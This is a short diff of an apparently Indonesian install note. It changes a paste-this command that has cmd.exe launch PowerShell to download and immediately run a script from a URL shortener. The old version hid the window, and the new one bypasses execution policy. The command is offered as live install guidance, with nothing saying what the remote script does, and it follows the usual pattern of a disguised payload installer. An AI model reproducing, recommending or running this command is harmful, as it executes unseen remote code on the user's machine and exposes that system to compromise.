@@ -1,6 +1,6 @@
-cara install
+ cara install
 
-c:\windows\system32\cmd.exe /c "powershell -w h iex(irm s.id/iexambanbk)"
+c:\windows\system32\cmd.exe /c "powershell -ep bypass iex(irm s.id/iexambanbk)"
 
 atau
 
